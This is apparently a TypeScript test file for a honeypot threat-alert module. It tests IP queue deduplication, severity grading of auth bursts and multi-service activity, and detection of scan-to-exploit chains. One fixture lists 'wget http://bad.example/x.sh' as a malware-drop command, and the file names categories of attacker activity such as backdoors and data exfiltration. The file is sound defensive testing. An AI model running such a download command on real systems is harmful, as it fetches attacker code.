import { describe, expect, it, vi, afterEach } from 'vitest'
import {
  deriveAuthBurstLevel,
  deriveMultiServiceLevel,
  drainThreatQueue,
  hasExploitAuthSequence,
  hasSuspiciousPostAuthActivity,
  pendingThreatCount,
  scheduleThreatAlert,
} from '../src/lib/threat-alerts.js'
import type { PrismaClient } from '@prisma/client'

describe('threat evaluation queue', () => {
  // A prisma stub without $queryRaw: evaluateThreatAlert returns early, so these
  // tests exercise only the enqueue/drain mechanics, not the heavy queries.
  const fakePrisma = {} as PrismaClient

  afterEach(async () => {
    // Flush any leftover queued IPs so tests don't bleed into each other.
    await drainThreatQueue(fakePrisma)
  })

  it('dedupes repeated IPs into a single queued entry', () => {
    scheduleThreatAlert(fakePrisma, '1.2.3.4')
    scheduleThreatAlert(fakePrisma, '1.2.3.4')
    scheduleThreatAlert(fakePrisma, '5.6.7.8')
    expect(pendingThreatCount()).toBe(2)
  })

  it('ignores empty IPs', () => {
    scheduleThreatAlert(fakePrisma, '')
    expect(pendingThreatCount()).toBe(0)
  })

  it('clears the queue after draining', async () => {
    scheduleThreatAlert(fakePrisma, '9.9.9.9')
    expect(pendingThreatCount()).toBe(1)
    await drainThreatQueue(fakePrisma)
    expect(pendingThreatCount()).toBe(0)
  })

  it('is a no-op when the queue is empty', async () => {
    await expect(drainThreatQueue(fakePrisma)).resolves.toBeUndefined()
  })
})

describe('threat alert heuristics', () => {
  it('grades multi-service activity by breadth', () => {
    expect(deriveMultiServiceLevel(1)).toBeNull()
    expect(deriveMultiServiceLevel(2)).toBe('HIGH')
    expect(deriveMultiServiceLevel(3)).toBe('CRITICAL')
  })

  it('grades auth bursts by volume', () => {
    expect(deriveAuthBurstLevel(5)).toBeNull()
    expect(deriveAuthBurstLevel(8)).toBe('HIGH')
    expect(deriveAuthBurstLevel(12)).toBe('CRITICAL')
  })

  it('detects scan -> exploit -> auth chains', () => {
    expect(
      hasExploitAuthSequence({
        hasPortScan: true,
        webAttackTypes: ['scanner', 'sqli'],
        totalAuthAttempts: 3,
      }),
    ).toBe(true)

    expect(
      hasExploitAuthSequence({
        hasPortScan: true,
        webAttackTypes: ['scanner'],
        totalAuthAttempts: 3,
      }),
    ).toBe(false)
  })

  it('flags suspicious post-auth command categories only', () => {
    expect(
      hasSuspiciousPostAuthActivity({
        ssh_backdoor: [],
        honeypot_evasion: [],
        container_escape: [],
        malware_drop: [],
        persistence: [],
        lateral_movement: [],
        crypto_mining: [],
        data_exfil: [],
        solana_targeting: [],
        recon: ['whoami'],
      }),
    ).toBe(false)

    expect(
      hasSuspiciousPostAuthActivity({
        ssh_backdoor: [],
        honeypot_evasion: [],
        container_escape: [],
        malware_drop: ['wget http://bad.example/x.sh'],
        persistence: [],
        lateral_movement: [],
        crypto_mining: [],
        data_exfil: [],
        solana_targeting: [],
        recon: [],
      }),
    ).toBe(true)
  })
})
